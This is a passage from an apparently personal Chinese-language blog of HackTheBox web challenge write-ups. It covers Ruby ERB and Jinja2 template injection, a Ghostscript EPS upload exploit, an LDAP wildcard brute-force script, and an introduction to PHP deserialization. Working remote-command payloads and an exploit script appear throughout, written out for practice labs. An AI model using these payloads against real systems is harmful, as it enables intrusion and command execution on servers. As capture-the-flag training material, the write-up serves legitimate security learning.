xxxxj<span class="token operator">!</span><span class="token operator">&lt;</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span> <span class="token string-literal"><span class="token string">%>&lt;/h1></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>这里记得进行 URL 编码，查看回显。</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/POCssti.png" class="">

<p>已经探测出 SSTI 的存在性，我们尝试将 <code>7*7</code> 的地方替换为 system，exec 等命令执行语句。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token number">1111</span>
xxxxj<span class="token operator">!</span><span class="token operator">&lt;</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%=</span> exec <span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'cat f*'</span></span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>&lt;/h1></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/500Error.png" class="">

<p>但是传统的 system,exec 都无法直接回显。都要通过 vps 反弹 shell。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">file <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'|whoami'</span></span>  
puts open<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ubuntu  </span>
puts open<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span>gets <span class="token comment"># ubuntu</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>open可以回显出命令执行结果。</p>
<p>因此我们构造payload即可得到flag</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">neon<span class="token operator">=</span><span class="token number">1111</span><span class="token operator">%</span><span class="token number">0</span>axxxxj<span class="token operator">!</span><span class="token operator">&lt;</span>h1<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'|cat f*'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/NeonifyGetFlag.png" class="">

<ul>
<li>Flag: <strong>HTB{r3pl4c3m3n7_s3cur1ty}</strong></li>
</ul>
<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>本道题是 SSTI 的简单应用，结合正则表达式的绕过，挺有意思的一道入门级别题目。对于看着人畜无害的代码，实际上却隐藏了 RCE 的危害漏洞，给我们渗透也带来了不少的思路，看到源码时多看两眼，耐心一点。</p>
<h2 id="HackTheBox-petpet-rcbee"><a href="#HackTheBox-petpet-rcbee" class="headerlink" title="HackTheBox-petpet-rcbee"></a>HackTheBox-petpet-rcbee</h2><h3 id="0x01-前言-5"><a href="#0x01-前言-5" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近做 HTB 的题目打算先尝试一遍基础的漏洞挖掘，挖掘不出来的情况下再去看源代码。</p>
<ul>
<li>攻 –&gt; 攻的原理 –&gt; 守</li>
</ul>
<h3 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h3><p>靶场界面如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/petpetrcbee.png" class="">

<p>一看便是文件上传类的题目，尝试上传一句话木马，却返回状态码 500</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StatusCode500.png" class="">

<p>这里我的感觉是后台加了一些的验证，比如文件内容什么的，尝试上传一下正常的 png&#x2F;jpeg 图片</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UploadGif.png" class="">

<p>上传了一个 png 文件，接着图中之前在飞的小蜜蜂就变了，变成了一只手一直触摸上传的图片的 Gif，还是直接看源码吧。</p>
<ul>
<li>翻源码去看一看</li>
</ul>
<h3 id="0x03-源码剖析，代码审计"><a href="#0x03-源码剖析，代码审计" class="headerlink" title="0x03 源码剖析，代码审计"></a>0x03 源码剖析，代码审计</h3><p>先打开 util.py，寻找状态码为 500 的原因</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StatusCode500Code.png" class="">

<h5 id="代码审计，逐行分析"><a href="#代码审计，逐行分析" class="headerlink" title="代码审计，逐行分析"></a><strong>代码审计，逐行分析</strong></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
	tmp_path <span class="token operator">=</span> save_tmp<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
	bee <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>tmp_path<span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">)</span> <span class="token operator">//</span> 将当前的图片的模式转换为 RGBA
	frames <span class="token operator">=</span> <span class="token punctuation">[</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'application/static/img/*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">//</span> 把上传的图片存放到静态文件夹当中
	finalpet <span class="token operator">=</span> petmotion<span class="token punctuation">(</span>bee<span class="token punctuation">,</span> frames<span class="token punctuation">)</span> <span class="token operator">//</span> 设置图片尺寸
	filename <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>generate<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">.gif'</span></span>  <span class="token operator">//</span>  加载 gif
	finalpet<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>
		<span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>main<span class="token punctuation">.</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"UPLOAD_FOLDER"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>
		save_all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
		duration<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>
		loop<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
		append_images<span class="token operator">=</span>finalpet<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token operator">//</span> 设置文件属性
 	<span class="token punctuation">)</span>

 	os<span class="token punctuation">.</span>unlink<span class="token punctuation">(</span>tmp_path<span class="token punctuation">)</span>  
 	<span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'image'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'static/petpets/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">200</span>

 <span class="token keyword">except</span><span class="token punctuation">:</span>
 	<span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'failed'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Something went wrong'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不知道为什么我总是觉得这个没有什么过滤，不过最后我上传的文件被 <code>convert(&#39;RGBA&#39;)</code> 之后，一定会被转化成图片的样子，所以需要在编写 exp 上多花一些功夫。需要在静态界面去弹 flag。</p>
<h4 id="exp-的编写"><a href="#exp-的编写" class="headerlink" title="exp 的编写"></a>exp 的编写</h4><p>此 exp 摘自网上<br>首先是文件头，需要表明自己是图片的身份</p>
<ul>
<li>文件头：</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100  &#x2F;&#x2F; ESPF 的文件头

userdict &#x2F;setpagedevice undef
save
legal
&#123; null restore &#125; stopped &#123; pop &#125; if
&#123; legal &#125; stopped &#123; pop &#125; if
restore
mark &#x2F;OutputFile (%pipe%car flag &gt;&gt; &#x2F;app&#x2F;application&#x2F;sttic&#x2F;petpets&#x2F;flag.txt) currentdevice putdeviceprops<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编写完 exp 后上传文件，再访问 <a class="link"   target="_blank" rel="noopener" href="http://134.209.28.38:31489/static/petpets/flag.txt" >http://134.209.28.38:31489/static/petpets/flag.txt<i class="fas fa-external-link-alt"></i></a></p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/petpetrcbeeGetFlag.png" class="">

<h3 id="0x04-回头看-exp，探究一下原理"><a href="#0x04-回头看-exp，探究一下原理" class="headerlink" title="0x04 回头看 exp，探究一下原理"></a>0x04 回头看 exp，探究一下原理</h3><p>查阅很多的资料，最相关的是 ImageMagick 的一些 CVE 的复现。<br>最后发现是 PostScript 写的，需要 ghostScript 作为解释器。作为小 exp 即可。</p>
<h2 id="HackTheBox-Phonebook"><a href="#HackTheBox-Phonebook" class="headerlink" title="HackTheBox-Phonebook"></a>HackTheBox-Phonebook</h2><h3 id="0x01-靶场简单分析"><a href="#0x01-靶场简单分析" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><ul>
<li>界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebook.png" class="">

<p>题目的描述: Who is lucky enough to be included in the phonebook?</p>
<p>这感觉是只要登录进去即可获得 flag 吧？</p>
<p>又看到下面那句话</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebookhint.png" class="">

<p>总归是身份认证的问题，先试试爆破，再尝试 SQL 注入。</p>
<h3 id="0x02-做题历程"><a href="#0x02-做题历程" class="headerlink" title="0x02 做题历程"></a>0x02 做题历程</h3><p>先随意输入数据，再抓包看一看</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/BaseBag.png" class="">

<p>尝试发包爆破，可能是自己字典不太好，爆破失败。—————— 但总感觉这里的用户名是 Reese，直接爆破一番。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/IntruderBomb.png" class="">

<p>尝试一下 SQL 注入，先用万能密码。失败</p>
<ul>
<li>尝试使用通配符 “<code>*</code>“ 登录，用户名密码都设置为 <code>*</code>，登录成功，但界面并无数据与 flag。</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Nothing.png" class="">

<p>接着我们搜索 Reese，因为题目刚开始的 hint 中，是 Reese 说的话，由此猜测 Reese 可能是开发人员，或者是有较高权限的人，找到 Reese 之后再回到登录界面爆破。走来走去最后还是爆破，笑死。</p>
<ul>
<li>结果是爆破不出来，太邪门了，密码就是 flag</li>
<li>这不知道源码是怎么写的真的想看看。</li>
</ul>
<p>尝试密码 <code>HTB*</code>，居然登录成功</p>
<h3 id="0x03-编写-exp"><a href="#0x03-编写-exp" class="headerlink" title="0x03 编写 exp"></a>0x03 编写 exp</h3><p>编写爆破脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://159.65.81.40:30797/login'</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
t<span class="token operator">=</span><span class="token number">0</span>
d<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;'</span>
password<span class="token operator">=</span><span class="token string">''</span>
flag<span class="token operator">=</span><span class="token string">'HTB&#123;'</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        password<span class="token operator">=</span>flag<span class="token operator">+</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-]testing  %s     '</span> <span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
        password<span class="token operator">=</span>password<span class="token operator">+</span><span class="token string">'*'</span>
        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'reese'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span>password
        <span class="token punctuation">&#125;</span>
        html<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'No search results'</span> <span class="token keyword">in</span> html<span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]%s"</span> <span class="token operator">%</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"failed"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            t<span class="token operator">=</span><span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:%s"</span> <span class="token operator">%</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebookexp.png" class="">

<p>flag: HTB{d1rectory_h4xx0r_is_k001}</p>
<h2 id="HackTheBox-Templated"><a href="#HackTheBox-Templated" class="headerlink" title="HackTheBox-Templated"></a>HackTheBox-Templated</h2><h3 id="0x01-靶场简单分析-1"><a href="#0x01-靶场简单分析-1" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><ul>
<li>靶场界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Templated.png" class="">

<p>题目的描述是 Can you exploit this simple mistake?</p>
<p>并不是特别有思路，靶场界面说此界面还仍在建造当中，那会不会是里面还存在着备份文件？试试吧先。</p>
<p>备份文件并不存在，难搞，再看看。</p>
<p>&#x2F;templates 一般就是 Java 的接口文件夹，通过写接口去访问的，这里我们尝试一下 &#x2F;templates，看看能不能获取到资源。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Strange404.png" class="">

<p>这里感觉有点奇怪，接着我又换了其他的接口，还是差不多的界面，抓包后就更加疑惑了，明明状态码是 200，出来的界面却是 404？</p>
<ul>
<li>第一反应是界面写了 404 界面的问题，就是手动编写 404 界面。</li>
</ul>
<blockquote>
<p>看到这里的下面一行 “Proudly Powered by Flash&#x2F;jinja2”<br>这是 python flask 开发的部分，因为自己没有这方面的技术栈，去找一找相关的漏洞，并熟悉一下知识。</p>
</blockquote>
<h3 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h3><p>这里先挂上 payload 吧，后续再来讲原理。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Payload.png" class="">
<h3 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h3><p>这里就可以通过python的魔术方法，首先通过<code>__class__</code>获取对象的类，然后<code>__mro__</code>获取对象继承的类，因为所有的对象都是继承自object，这样就可以拿到object类了，再通过<code>__subclasses__</code>获取到object的子类，子类中的<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的命名空间里有<code>__builtins__</code>，最后使用<code>__import__</code>方法导入<code>os</code>库就可以任意命令执行了。最后的payload如下。 —————— 摘自<a class="link"   target="_blank" rel="noopener" href="https://blog.ncu204.com/post/hack_the_box/templated/" >flythief 师傅博客<i class="fas fa-external-link-alt"></i></a></p>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">186</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TemplatedGetFlag.png" class="">
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本题是基于 python 的 Flask 的 ssti 漏洞，完全不会，去学一下，后续总结。移步至<a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/29/Python-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" >Python Flask模板注入 | 芜风 (withd-raw.github.io)<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="HackTheBox-Toxic"><a href="#HackTheBox-Toxic" class="headerlink" title="HackTheBox Toxic"></a>HackTheBox Toxic</h2><p>见题看代码便知，是 PHP 反序列化漏洞</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/PHPSerializeAndUn.png" class="">

<h3 id="0x01-一些前置知识"><a href="#0x01-一些前置知识" class="headerlink" title="0x01 一些前置知识"></a>0x01 一些前置知识</h3><ul>
<li>部分内容摘自 <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674" >twosmi1e师傅<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h4 id="1-PHP序列化是什么"><a href="#1-PHP序列化是什么" class="headerlink" title="1. PHP序列化是什么"></a>1. PHP序列化是什么</h4><h5 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment">//将一个对象转换成一个字符串</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//将字符串还原成一个对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>通过序列化与反序列化我们可以很方便的在 PHP 中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造 payload 攻击。</p>
<h5 id="体验一下序列化和反序列化"><a href="#体验一下序列化和反序列化" class="headerlink" title="体验一下序列化和反序列化"></a>体验一下序列化和反序列化</h5><ul>
<li>序列化，将一个对象转换为字符串</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 首尾的 php 头因为博客代码高亮 bug 已省略</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span>
 <span class="token punctuation">&#123;</span>
 <span class="token keyword">private</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag&#123;233&#125;"</span><span class="token punctuation">;</span>
 <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span>
 <span class="token keyword">static</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"bbb"</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
  
 <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">;</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

	 
	 
输出<span class="token operator">--</span><span class="token operator">-></span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"testflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag&#123;233&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<hr>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Test1Result.png" class="">

<ul>
<li>反序列化，将一个字符串转换为对象</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 首尾的 php 头因为博客代码高亮 bug 已省略</span>
 <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span><span class="token punctuation">;</span>

 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	 
	 
输出<span class="token operator">--</span><span class="token operator">-></span> <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"testflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag&#123;233&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="2-php-的魔术方法"><a href="#2-php-的魔术方法" class="headerlink" title="2. php 的魔术方法"></a>2. php 的魔术方法</h4><p>PHP 的魔术方法同 Python 当中的定义一样，也就是函数名前面加上 <code>__</code> </p>
<p>常见的 PHP 魔术方法如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//创建对象时触发</span>
<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//对象被销毁时触发</span>
<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span>
<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span>
<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于从不可访问的属性读取数据</span>
<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于将数据写入不可访问的属性</span>
<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span>
